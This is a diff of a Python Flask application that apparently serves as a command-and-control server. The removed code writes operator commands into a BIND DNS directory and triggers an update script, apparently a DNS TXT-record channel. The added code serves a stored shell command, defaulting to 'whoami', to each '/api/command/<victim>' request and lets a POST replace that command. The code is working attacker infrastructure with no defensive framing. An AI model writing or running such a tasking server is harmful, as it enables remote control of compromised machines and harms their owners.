@@ -1,37 +1,20 @@
 from flask import Flask, request, jsonify
-import os
-from datetime import datetime
 
 app = Flask(__name__)
 
-COMMAND_LOG = "../logs/commands.log"
-CMD_FILE = "/etc/bind/commands/cmd.txt"
+commands = {"default": "whoami"}
 
-@app.route('/command', methods=['POST'])
-def add_command():
-    cmd = request.json.get("cmd", "").strip()
-    if not cmd:
-        return jsonify({"error": "No command provided"}), 400
+@app.route("/api/command/<victim>", methods=["GET"])
+def get_command(victim):
+    return jsonify({"victim": victim, "command": commands["default"]})
 
-    timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
-    log_entry = f"[{timestamp}] {cmd}\n"
-    with open(COMMAND_LOG, "a") as f:
-        f.write(log_entry)
+@app.route("/api/command/<victim>", methods=["POST"])
+def set_command(victim):
+    data = request.json
+    if "command" not in data:
+        return jsonify({"error": "Missing command"}), 400
+    commands["default"] = data["command"]
+    return jsonify({"victim": victim, "command": commands["default"]})
 
-    with open(CMD_FILE, "w") as f:
-        f.write(cmd)
-
-    os.system("/usr/local/bin/update-txt.sh")
-
-    return jsonify({"status": "command saved", "cmd": cmd})
-
-@app.route('/command', methods=['GET'])
-def get_command():
-    if not os.path.exists(CMD_FILE):
-        return jsonify({"cmd": ""})
-    with open(CMD_FILE) as f:
-        cmd = f.read().strip()
-    return jsonify({"cmd": cmd})
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
